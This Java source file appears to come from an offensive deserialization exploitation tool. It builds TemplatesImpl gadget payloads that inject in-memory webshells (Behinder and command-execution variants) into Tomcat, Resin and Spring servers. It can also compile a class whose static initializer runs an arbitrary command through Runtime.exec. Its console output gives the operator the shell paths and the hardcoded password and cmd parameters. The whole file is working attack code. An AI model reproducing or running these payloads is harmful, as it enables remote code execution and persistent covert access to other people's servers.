package org.util;


import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.memshell.resin.ResinListenerBehinder;
import org.memshell.resin.ResinListenerCMD;
import org.memshell.spring.SpringInterceptorBehinder;
import org.memshell.tomcat.TomcatListenerBehinder;
import org.memshell.tomcat.TomcatListenerBehinderByLei;
import org.memshell.tomcat.TomcatListenerCMD;

import java.io.IOException;
import java.lang.reflect.Field;
import java.util.UUID;

public class TemplateUtils {
    public static TemplatesImpl getTemplate(String common, String path) throws Exception {
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        Class clazz = TemplatesImpl.class.newInstance().getClass();

        if (common.equals("TomcatWsSocketCMD")) {
            // 该if中用于实现无需继承AbstractTranslet类的打法，由于该步骤生成的数据可能较大，故一般不走这个
            Field name = clazz.getDeclaredField("_name");
            name.setAccessible(true);
            name.set(templates, "zzz");

            Reflections.setFieldValue(templates, "_transletIndex", 0);
            Field bytecodes = clazz.getDeclaredField("_bytecodes");
            bytecodes.setAccessible(true);

            byte[][] b = {switchClass(common, path), switchClass("NullClass", path)};
            bytecodes.set(templates, b);
            Field tfactory = clazz.getDeclaredField("_tfactory");
            tfactory.setAccessible(true);
            tfactory.set(templates, new TransformerFactoryImpl());

            return templates;
        }
        byte[][] targetByteCodes = new byte[][]{switchClass(common, path)};
        Field[] Fields = clazz.getDeclaredFields();
        for (Field Field : Fields) { //遍历Fields数组
            try {
                Field.setAccessible(true);  //对数组中的每一项实现私有访问
                if (Field.getName() == "_bytecodes") {
                    Field.set(templates, targetByteCodes);
                }
                if (Field.getName() == "_class") {
                    Field.set(templates, null);
                }
                if (Field.getName() == "_name") {
                    Field.set(templates, "abc");
                }
                if (Field.getName() == "_tfactory") {
                    Field.set(templates, new TemplatesImpl());
                }
            } catch (Exception e) {
            }
        }
        return templates;
    }

    public static byte[] switchClass(String common, String path) throws CannotCompileException, NotFoundException, IOException {
        // 在此处增加内存马，根据传入命令-c进行加入
        switch (common) {
            // TomcatListenerBehinderByLei,雷桑的马子配雷桑的改版冰蝎
            case "TomcatListenerBehinderByLei":
                print("TomcatListenerBehinderByLei", "");
                return TomcatListenerBehinderByLei.generateListenerMemShell();
            // TomcatListenerCMD
            case "TomcatListenerCMD":
                print("TomcatListenerCMD", "");
                return TomcatListenerCMD.generateListenerMemShell();
            case "TomcatListenerBehinder":
                print("TomcatListenerBehinder", "");
                return TomcatListenerBehinder.generateListenerMemShell();
            // Resin改版冰蝎内存马
//            case "ResinListenerBehinderByLei":
//                return ResinListenerBehinder.generateListenerMemShell();
            // Resin原版冰蝎内存马
            case "ResinListenerBehinder":
                print("ResinListenerBehinder", "");
                return ResinListenerBehinder.generateListenerMemShell();
            // Resin CMD内存马
            case "ResinListenerCMD":
                print("ResinListenerCMD", "");
                return ResinListenerCMD.generateListenerMemShell();
            // Resin CMD内存马
            case "SpringInterceptorBehinder":
                print("SpringInterceptorBehinder", path);
                return SpringInterceptorBehinder.generateListenerMemShell(path);
            // 返回一个空的class,用于实现无需AbstractTranslet的打法
            case "NullClass":
                return nullClass();
            default:
                //解决单次运行程序的过程中多次调用该方法，导致名字重复的问题
                UUID uuid = UUID.randomUUID();
                String replace = uuid.toString().replace("-", "");

                ClassPool pool = ClassPool.getDefault();
                CtClass cc = pool.makeClass("a" + replace);
                String cmd = "Runtime.getRuntime().exec(\"" + common + "\");";
                //向静态代码块插入恶意代码，插入到构造函数也可以
                cc.makeClassInitializer().insertBefore(cmd);
                //需设置此项才能实现newinstance，具体原因请看defineTransletClasses和getTransletInstance源码
                cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
                cc.setName("A" + replace);
                byte[] evilbytes = cc.toBytecode();
                return evilbytes;
        }
    }

    public static void print(String s, String path) {
        if (s.contains("TomcatListener")) {
            System.out.println("内存马访问地址随机,例如 /mechoy");
        } else if (s.contains("ResinListener")) {
            System.out.println("内存马访问无固定,但需要该uri从未被访问过,推荐 /[一段随机字符]");
        } else if (s.contains("SpringInterceptor")) {
            System.out.println("内存马访问地址：" + path);
        } else if (s.contains("CMD")) {
            System.out.println("连接参数：?pass=aaa&cmd=[要执行的命令]");
        } else if (s.contains("Behinder") && !s.contains("Lei")) {
            System.out.println("连接pass：aaa");
        } else if (s.contains("Lei")) {
            System.out.println("需使用改版冰蝎ByLei进行连接");
        }
        System.out.println("注意是存在context-path是否为空,不为空时须在访问地址前增加context-path的值");
    }

    public static byte[] nullClass() throws IOException, CannotCompileException {
        //解决单次运行程序的过程中多次调用该方法，导致名字重复的问题
        UUID uuid = UUID.randomUUID();
        String replace = uuid.toString().replace("-", "");

        ClassPool pool = ClassPool.getDefault();
        String className = "A" + replace;
        CtClass ctClass = pool.makeClass(className);
        return ctClass.toBytecode();
    }
}
